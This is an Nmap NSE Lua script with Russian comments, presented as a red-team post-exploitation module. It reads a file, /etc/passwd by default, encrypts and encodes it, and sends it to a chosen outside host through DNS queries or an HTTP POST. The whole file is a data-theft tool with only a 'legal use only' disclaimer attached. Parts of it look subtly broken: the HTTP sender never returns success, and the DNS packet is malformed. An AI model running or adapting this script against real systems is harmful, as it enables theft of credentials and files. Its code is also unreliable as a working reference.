-- data_exfiltration.nse
--
-- Модуль постэксплуатации для демонстрации или проверки каналов скрытой эксфильтрации данных
-- Поддерживает вывод сжатой, зашифрованной информации с целью обучения и тестирования защитных решений
--
-- ВНИМАНИЕ: Использование допускается ТОЛЬКО в легальных целях (пентест, аудит)
--
-- Автор: TeslaAI Red Team
-- Лицензия: Same as Nmap

local nmap = require "nmap"
local stdnse = require "stdnse"
local string = require "string"
local openssl = require "openssl"
local shortport = require "shortport"
local socket = require "socket"
local base64 = require "base64"
local compress = require "zlib"
local io = require "io"
local lpeg = require "lpeg"

description = [[
Этот скрипт демонстрирует постэксплуатационную эксфильтрацию данных через нестандартные каналы (например, DNS или HTTP POST).
Сценарий может использоваться для оценки устойчивости инфраструктуры к скрытым утечкам.
]]

author = "TeslaAI Red Team"

license = "Same as Nmap"

categories = {"post-exploit", "intrusive", "malware", "auth"}

portrule = function(host)
  return true -- модуль работает на уровне хоста
end

local function encrypt_and_compress(data, key)
  local compressed = compress.deflate()(data, "finish")
  local cipher = openssl.cipher.get("aes-256-cbc")
  local iv = openssl.rand.bytes(16)
  local enc = cipher:encrypt(key, iv):final(compressed)
  return base64.encode(iv .. enc)
end

local function send_via_dns(data, target)
  local udp = nmap.new_socket()
  udp:set_timeout(3000)
  local chunks = {}
  for i = 1, #data, 40 do
    table.insert(chunks, data:sub(i, i + 39))
  end
  for _, chunk in ipairs(chunks) do
    local domain = chunk:gsub(".", function(c)
      return string.format("%02x", string.byte(c))
    end) .. ".exf." .. target
    udp:sendto(target, 53, "\03\01\00\00\01\00\00\00\00\00\00" .. domain)
  end
  udp:close()
end

local function send_via_http(data, target)
  local tcp = nmap.new_socket()
  tcp:set_timeout(5000)
  local ok, err = tcp:connect(target, 80)
  if not ok then return false, err end
  local payload = "POST /exf HTTP/1.1\r\nHost: " .. target .. "\r\nContent-Length: " .. #data .. "\r\n\r\n" .. data
  tcp:send(payload)
  tcp:close()
end

action = function(host)
  local exf_key = stdnse.get_script_args("data_exfiltration_key") or "super_secret_password_32b"
  local method = stdnse.get_script_args("data_exfiltration_method") or "dns"
  local target = stdnse.get_script_args("data_exfiltration_target") or "127.0.0.1"
  local data_file = stdnse.get_script_args("data_exfiltration_file") or "/etc/passwd"

  local fh = io.open(data_file, "rb")
  if not fh then return "Не удалось открыть файл: " .. data_file end

  local raw_data = fh:read("*all")
  fh:close()

  local payload = encrypt_and_compress(raw_data, exf_key)

  if method == "dns" then
    send_via_dns(payload, target)
    return "Данные отправлены через DNS-эксфильтрацию на " .. target
  elseif method == "http" then
    local ok, err = send_via_http(payload, target)
    if not ok then return "Ошибка отправки HTTP: " .. err end
    return "Данные отправлены через HTTP POST на " .. target
  else
    return "Неизвестный метод эксфильтрации: " .. method
  end
end
